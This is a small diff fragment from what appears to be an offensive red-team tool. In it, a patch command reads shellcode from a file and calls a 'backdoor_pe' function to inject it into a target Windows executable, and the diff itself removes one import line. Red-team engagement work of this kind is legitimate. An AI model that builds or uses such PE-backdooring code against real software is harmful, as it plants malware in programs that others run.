@@ -903,7 +903,6 @@ def cmd_patch(args, cfg, ws):
         # pre-built shellcode provided — skip donut
         with open(args.sc, "rb") as f:
             shellcode = f.read()
-        from builders.patcher import backdoor_pe
         backdoor_pe(args.target, shellcode, args.output, args.section)
     else:
         # derive stager URL from engagement config (same logic as cmd_build)
